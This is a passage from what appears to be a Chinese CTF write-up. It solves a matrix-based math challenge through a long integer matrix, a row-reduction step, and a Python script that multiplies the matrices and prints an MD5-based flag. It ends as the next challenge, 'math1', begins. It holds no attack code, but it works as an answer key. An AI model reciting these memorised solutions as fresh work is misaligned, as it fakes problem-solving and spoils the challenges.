class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>;</span><br><span class="line"><span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">3</span>;</span><br><span class="line"><span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">10</span>;</span><br><span class="line"><span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>;</span><br><span class="line"><span class="number">10</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>;</span><br><span class="line"><span class="number">9</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>;</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>;</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>;</span><br><span class="line"><span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>;</span><br><span class="line"><span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>;</span><br><span class="line"><span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>;</span><br><span class="line"><span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>;</span><br><span class="line"><span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>;</span><br><span class="line"><span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>;</span><br><span class="line"><span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>;</span><br><span class="line"><span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>;</span><br><span class="line"><span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>;</span><br><span class="line"><span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>;</span><br><span class="line"><span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>;</span><br><span class="line"><span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>;</span><br><span class="line"><span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>;</span><br><span class="line"><span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>;</span><br><span class="line"><span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>;</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>;</span><br><span class="line"><span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>;</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>;</span><br><span class="line"><span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>;</span><br><span class="line"><span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>;</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>;</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>;</span><br><span class="line"><span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>;</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>;</span><br><span class="line"><span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>;</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>;</span><br><span class="line"><span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>;];</span><br><span class="line"></span><br><span class="line">t = rref(aTbT)</span><br></pre></td></tr></table></figure><p>舍去下半部分0矩阵，得到32*32的单位阵T</p><p>代回题目，得解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    aTbT = []</span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        tmp = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> i.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> each != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                tmp.append(<span class="built_in">int</span>(each))</span><br><span class="line">        aTbT.append(tmp)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(tmp)[<span class="number">1</span>:-<span class="number">1</span>]+<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">aT = aTbT[:<span class="number">32</span>]</span><br><span class="line">bT = np.array(aTbT[<span class="number">32</span>:])</span><br><span class="line"></span><br><span class="line">T = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    tmp = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    tmp[i] = <span class="number">1</span></span><br><span class="line">    T.append(tmp)</span><br><span class="line"></span><br><span class="line">res = np.dot(bT, np.dot(T, aT))</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(res[:, <span class="number">0</span>])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> i == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        flag = flag + <span class="built_in">int</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line">f = hashlib.md5()</span><br><span class="line">f.update(<span class="built_in">str</span>(flag).encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+<span class="built_in">str</span>(f.hexdigest())+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="math1（200）"><a href="#math1（200）" class="headerlink" title="math1（200）"></a>math1（200）</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td 